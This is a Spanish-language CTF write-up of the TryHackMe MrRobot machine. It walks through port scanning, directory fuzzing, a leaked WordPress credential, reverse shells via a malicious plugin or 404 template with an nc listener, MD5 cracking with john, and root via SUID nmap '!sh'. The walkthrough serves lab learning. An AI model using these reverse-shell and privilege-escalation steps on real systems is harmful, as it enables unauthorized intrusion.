---
toc: true
comments: true
title: TryHackMe - MrRobot CTF
layout: post
title: TryHackMe - MrRobotCTF
date: 2023-10-03 20:45 -0300
categories: [TryHackMe, Easy, CTF]
tags: [Wordpress, PrivEsc]    
image: /assets/Posts/MrRobot/1_Teaser.png
---

Para dar inicio al blog decidí hacer el CTF de MrRobot. Una serie que me gusta mucho y su CTF parece estar en niveles muy altos de calidad y lleno de referencias. No compartiré las banderas encontradas, pero sí guiaré a quien quiera hasta ellas.


## Enumeración
Comenzamos con un escaneo de puertos utilizando nmap.
Haremos el siguiente escaneo que, pese a no ser el más complejo, nos dará resultados más rápidos. 

```shell
$ nmap -p- --open -sS -Pn --min-rate 5000 -v -n 10.10.116.55
```

Recordemos que las flags implican lo siguiente:

- ```-p-```: Indicamos que el escaneo se realizará en todos los puertos disponibles.
- ```--open```: Indicamos que solo estamos interesados en los puertos que están abiertos.
- ```-sS```: Esta bandera indica que deseamos realizar un "Escaneo SYN", lo que significa que los paquetes que enviaremos nunca completarán las conexiones TCP, lo que hará que nuestro escaneo sea menos intrusivo y más silencioso.
- ```-Pn```: Con esta opción indicamos que no queremos realizar el descubrimiento de host (ya que conocemos a nuestro objetivo).
- ```--min-rate 5000```: Esta bandera se puede intercambiar por ```-T5```, ambos están destinados a acelerar nuestro escaneo (y hacerlo más ruidoso...). Para ser más detallados, esta bandera indica que no queremos enviar menos de 5,000 paquetes por segundo.
- ```-v```: (verbose) Para ver qué puertos aparecen a medida que avanzamos.
- ```-n```: No queremos que se realice la resolución DNS, ya que estamos escaneando una dirección IP, no un dominio.

Del escaneo obtenemos lo siguiente:

```shell
# nmap -p- --open -sS -Pn --min-rate 5000 -v -n 10.10.116.55 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 10:59 -03
Initiating SYN Stealth Scan at 10:59
Scanning 10.10.116.55 [65535 ports]
Discovered open port 80/tcp on 10.10.116.55
Discovered open port 443/tcp on 10.10.116.55
Completed SYN Stealth Scan at 11:00, 26.58s elapsed (65535 total ports)
Nmap scan report for 10.10.116.55
Host is up (0.24s latency).
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```
En este punto sabemos que hay 2 puertos abiertos: 80 (HTTP) y 443 (HTTPS). Viendo esto y considerando que el puerto SSH no está abierto (al menos hacia el exterior), se puede deducir que la única forma de acceder a la máquina es a través de estos servicios web.

Una vez que sabemos qué puertos están abiertos es realizar un escaneo a esos puertos ejecutando una serie de scripts para obtener más información: versión del servidor, tecnología, posibles vulnerabilidades a priori, etc.

```shell
nmap -sV -sC -p 80,443 -Pn -n --min-rate 5000 -A 10.10.116.55
```

Donde:

- ```-sV```-: Si es posible, mostrará la versión del servicio que se está ejecutando en cada puerto.
- ```-A```-: Ejecutaremos todos los scripts relevantes (proporcionados por nmap) en estos puertos.
- ```-p 80,443```-: Puertos abiertos.

Obteniendo esta salida:

```shell
$ nmap -sV -sC -p 80,443 -Pn -n --min-rate 5000 -A 10.10.116.55
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 11:05 -03
Nmap scan report for 10.10.116.55
Host is up (0.30s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Linux 5.4 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Android 4.1.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   347.71 ms 10.8.0.1
2   348.81 ms 10.10.116.55
```

Antes de entrar por costumbre ejecutamos WhatWeb para obtener información adicional de nuestro objetivo, aunque no resulto de mucho.


```shell
$ whatweb https://10.10.116.55
https://10.10.116.55 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.116.55], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
```

Procedemos a entrar al sitio como haria cualquier user:
![Desktop View](/assets/Posts/MrRobot/3_WebIni.png){: width="972" height="589" }
_Pagina central_

Así que vamos a visitar la web... Después de una impresionante y muy "hacker" introducción, nos encontramos con este menú.

```bash
/prepare
/fsociety
/inform
/question
/wakeup
/join
```

Dado que no parece haber más información a la vista, procederemos a realizar un Fuzzing, que consiste en realizar solicitudes al servidor para varias rutas extraídas de un diccionario con el objetivo de encontrar rutas que existan. Para esto, utilizaremos gobuster, aunque no es diferente que dirb o ffuf.

```bash
$ gobuster dir -u http://10.10.116.55/ -w /usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt 
```
El resultado es bastante completo, pero de momento solo nos interesan los de estado 200 por lo que ejecutaremos el siguiente comando ```grep```:

```bash
# grep "(Status: 200)" temp 
/admin/               (Status: 200) [Size: 1077]                                        
/admin/index          (Status: 200) [Size: 1188]                                        
/admin/index.html     (Status: 200) [Size: 1188]                                        
/index.html           (Status: 200) [Size:   1188]                                                                                
/license              (Status: 200) [Size: 309]                                                                                 
/license.txt          (Status: 200) [Size: 309]                                                                                 
/readme               (Status: 200) [Size: 64]                                                                                  
/readme.html          (Status: 200) [Size: 64]                                                                                  
/robots.txt           (Status: 200) [Size: 41]                                                                                  
/wp-content/          (Status: 200) [Size: 0]                                                                                                  
/wp-config.php        (Status: 200) [Size: 0]                                                                                                  
/wp-login.php         (Status: 200) [Size: 2599]                                                                                               
/wp-login/            (Status: 200) [Size: 2599]      
```
La experiencia nos dice que estamos frente a un sitio hecho con Wordpress, pero antes veremos el **robots.txt** que suele tener informacion jugosa.

### Robots.txt y primera flag
El archivo robots es el siguiente:

```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

De acceder a http://10.10.116.55/key-1-of-3.txt tendremos nuestra primera flag :)

El otro directorio al que podemos acceder es un diccionario con lo que podremos ver un largo diccionario de usernames.

![Desktop View](/assets/Posts/MrRobot/4_diccionario.png){: width="972" height="589" }
_Diccionario encontrado_

### Analizando lo enumerado

No nos podemos olvidar que tenemos mas endpoints para analizar, por ejemplo el de la licencia posee un mensaje escondido

![Desktop View](/assets/Posts/MrRobot/license.png){: width="972" height="589" }
_Contenido escoondido en el codigo fuente_

Pasandlo por Cyberchef obtenemos lo siguiente:

![Desktop View](/assets/Posts/MrRobot/Cyberchef.png){: width="972" height="589" }
_Uso de CyberChef_

Con esto sabemos el usuario y contraseña: ```elliot:ER28-0652```

## Intrusion

Con la primera flag conseguida podremos pasar a ver los siguientes sitios de Wordpress presentes. El más llamativo es el login del admin ubicado en /wp-login/    

![Desktop View](/assets/Posts/MrRobot/Enumerate.png){: width="972" height="589" }
_Enumeracion de usuarios_

Si ingresamos un usuario inválido, el gestor de contenido nos informa que el usuario es inválido, pero si ingresamos uno que existe, nos dice que para ese usuario la contraseña es incorrecta.

Gracias a esta vulnerabilidad, podríamos enumerar posibles usuarios que se encuentren en la base de datos, pero no será necesario, ya que estamos interesados en Elliot (basándonos en la temática del CTF, podemos inferir una serie de posibles nombres).

Al revisar el diccionario que obtuvimos previamente, pude ver que hay muchas palabras repetidas, lo que hará que nuestro ataque de fuerza bruta basado en el diccionario tome más tiempo. Para solucionarlo, ordenaremos el diccionario y eliminaremos las líneas repetidas.

Ordenar el diccionario y eliminar las líneas duplicadas se hace con el siguiente comando:

```shell
$ sort fsocity.dic | uniq > fsocity-sorted.dic
```

Este comando ordenará el diccionario y guardará la versión ordenada sin líneas duplicadas en un archivo llamado "fsocity-sorted.dic".

Tenemos entonces un diccionario especial, un usuario enumerado (elliot), podemos atacar el sitio mientras exploramos con nuestro user elliot:

```bash
wpscan --url 10.10.6.71 --wp-content-dir wp-admin --usernames fsocity-sorted.dic --passwords fsocity-sorted.dic
```
_Nota: no resulto de nada util este comando_

Al entrar con elliot, tenemos el acceso de administrador a Wordpress:

![Desktop View](/assets/Posts/MrRobot/wearein.png){: width="972" height="589" }
_Entrada exitosa_

En este punto, mostraré 2 formas de explotar este servicio de WordPress (hay otras...) y obtener una shell inversa.

1. Subiendo un plugin falso.
2. Utilizando la plantilla 404.

Y si desean intentarlo por ustedes mismos, también pueden obtener una shell inversa mediante la carga de una imagen en la sección "Media". Solo tendríamos que agregar a nuestra payload con encabezado con los números mágicos del formato admitido por la web y renombrar la carga útil con ese formato. Para esto les recomiendo el uso de la tool de mi amigo: https://github.com/MachadoOtto/magik-monkee.

### Plugin Falso

Para la configuracion de plugins podemos dirigirnos al apartado correspondiente en Wordpress y cargar uno propio. Nuestro plugin tendra un codigo malicioso que al ejecutar se conecte a nuestra pc, dandonos acceso.

![Desktop View](/assets/Posts/MrRobot/Plugin.png){: width="972" height="589" }
_Entrada exitosa_

Para cumplir con los estandares de plugins debemos seguir la siguiente convencion de cabeceras:

```php
/*
Plugin Name:  Reverse Shell
Plugin URI: http://tryhackme.com
Description: Shell
Version: 1.0
Author: MFETERNAL
Author URI: http://tryhackme.com
Text Domain: Shell
Domain Path: /languages
*/
... Code ...
```



Y luego obtendremos una reverse-shell del siguiente enlace: ```https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php```

Cambiamos los valores de ip y de port (si lo desean), y luego ejecutamos un puerto de escucha en el puerto correspondiente, en mi caso el 1234:

```$ nc -lvp 1234```

Lo zipeamos con ```sudo zip reverse.zip PluginMalicioso.php``` y lo subimos. Luego solo queda activarlo desde la lista de plugins y ver su ejecucion:

![Desktop View](/assets/Posts/MrRobot/plugins.png){: width="972" height="589" }
_Entrada exitosa_

Desde nuestra shell de escucha:

```shell
$ nc -lvp 1234 
listening on [any] 1234 ...
10.10.6.71: inverse host lookup failed: Unknown host
connect to [10.8.184.197] from (UNKNOWN) [10.10.6.71] 36584
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 19:33:58 up 59 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Pagina 404 
La alternativa es generar una pagina de 404 not found maliciosa que al cargar ejecute una **reverse shell**. Vamos a Apperance -> Editor -> 404 Template.
Luego con esto seguimos la idea anterior de ir a: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php y obtener njuestra reverse shell con ```$ nc -lvp 1234```.

![Alt text](/assets/Posts/MrRobot/plugins.png){: width="972" height="589" }
_Post 404_


##  Dentro de la maquina

Luego de ejecutar cualquiera de los dos metodos estaremos dentro de la maquina. Aqui se recomienda empezar con un simple tratamiento de la tty:

```pyhton -c 'import pty; pty.spawn("/bin/bash")'```

Busquemos que usuarios existen:

![Desktop View](/assets/Posts/MrRobot/robot.png){: width="972" height="589" }
_Entrada exitosa_

Ahi encontraremos la **segunda llave**... pero esta restringida para un usuario llamado robot con privilegios 🤯

Copiemos entonces el archivo de contraseña en md5 a nuestra PC y busquemos romper los privilegios utilizando el rockyou.txt y jhon the ripper.

```bash
$ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashrobado
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)
1g 0:00:00:00 DONE (2023-10-05 16:17) 11.11g/s 452266p/s 452266c/s 452266C/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
```

Con eso obtuvimos la password de **robot** y podremos hacer ```su robot```...y robar su flag!


# Escalando privilegios

Logramos escalar desde daemon (que corre wordpress) a robot, pero nuestro objetivo final es llegar a root. Para eso ejecutaremos lo siguiente:

```shell
robot@linux:~$ sudo -l
[sudo] password for robot: 
Sorry, user robot may not run sudo on linux.
```

Como no pudimos escalar con sudo veremos que programas compartimos con root

```shell
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null

-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
```

El comando busca archivos propiedad del usuario "root" con el bit SUID activado en todo el sistema, mostrando información detallada y descartando errores.El mas llamativo es nmap.

Vamos al viejo y confiable https://gtfobins.github.io/ en busca de exploits para el contenido de nmap.

![Desktop View](/assets/Posts/MrRobot/nmap.png){: width="972" height="589" }
_Escaladas posibles de nmap_

```vim
robot@linux:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
Unknown command (nmap>) -- press h <enter> for help
nmap> !sh
# whoami
root
# ls
key-2-of-3.txt	password.raw-md5
# cd /root
# ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
```

# Conclusiones 

Luego de una maquina larga siempre es dificil recordar los puntos clave de aprendizaje. En esta maquina exisitieron los siguientes puntos clave:
1. Fuzzing a todo, encontrar el robots.txt es sencillo y estandar pero siempre puede haber algo escondido en otro lado.
2. De estar perdidos revisar el codigo fuente en busca de oro.
3. GTFOBINS es increible.

_Keep hacking_  🙈🙉🙊 
